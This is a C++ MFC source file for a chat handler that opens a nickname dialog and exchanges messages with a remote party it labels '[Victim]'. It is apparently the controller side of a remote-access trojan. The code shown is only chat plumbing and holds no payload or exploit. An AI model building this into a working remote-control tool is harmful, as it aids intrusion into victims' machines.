#include "stdafx.h"
#include "ChatSrv.h"
#include "ChatInputName.h"
#include "ChatDlg.h"
#include "resource.h"
CChatSrv::CChatSrv(CManager*pManager) :
	CMsgHandler(pManager)
{
	m_pDlg = NULL;
	memset(m_szNickName, 0, sizeof(m_szNickName));
}


CChatSrv::~CChatSrv()
{
}


void CChatSrv::OnOpen()
{
	CChatInputName dlg;
	dlg.DoModal();
	if (dlg.m_NickName.GetLength() != 0)
	{
		lstrcpyW(m_szNickName,dlg.m_NickName);
	}
	m_pDlg = new CChatDlg(this);
	if (m_pDlg->Create(IDD_CHAT_DLG,CWnd::GetDesktopWindow()) == FALSE)
	{
		Close();
		return;
	}
	//禁用SendMsg button.
	m_pDlg->GetDlgItem(IDOK)->EnableWindow(FALSE);
	m_pDlg->ShowWindow(SW_SHOW);
	//
}

void CChatSrv::OnClose()
{
	if (m_pDlg){
		m_pDlg->SendMessage(WM_CLOSE);
		m_pDlg->DestroyWindow();

		delete m_pDlg;
		m_pDlg = NULL;
	}
}



void CChatSrv::OnChatInit(DWORD dwRead, char*szBuffer)
{
	DWORD dwStatu = *(DWORD*)szBuffer;
	if (dwStatu)
	{
		//开始聊天
		SendMsg(CHAT_BEGIN, (char*)m_szNickName, sizeof(WCHAR)*((wcslen(m_szNickName)+1)));
		m_pDlg->GetDlgItem(IDOK)->EnableWindow(TRUE);
	}
	else
	{
		Close();
	}
}
void CChatSrv::OnChatMsg(DWORD dwRead, char*szbuffer)
{
	//显示到屏幕上
	CString NewMsg;
	NewMsg.Format(L"[Victim]: %s\r\n", szbuffer);
	m_pDlg->m_MsgList.SetSel(-1);
	m_pDlg->m_MsgList.ReplaceSel(NewMsg);
}

void CChatSrv::OnReadMsg(WORD Msg,  DWORD dwSize, char*Buffer)
{
	switch (Msg)
	{
	case CHAT_INIT:
		OnChatInit(dwSize, Buffer);
		break;
	case CHAT_MSG:
		OnChatMsg(dwSize, Buffer);
		break;
	default:
		break;
	}
}

void CChatSrv::OnWriteMsg(WORD Msg, DWORD dwSize, char*Buffer)
{

}

void CChatSrv::SendMsgMsg(WCHAR*szMsg)
{
	SendMsg(CHAT_MSG, (char*)szMsg, sizeof(WCHAR)*(wcslen(szMsg) + 1));
}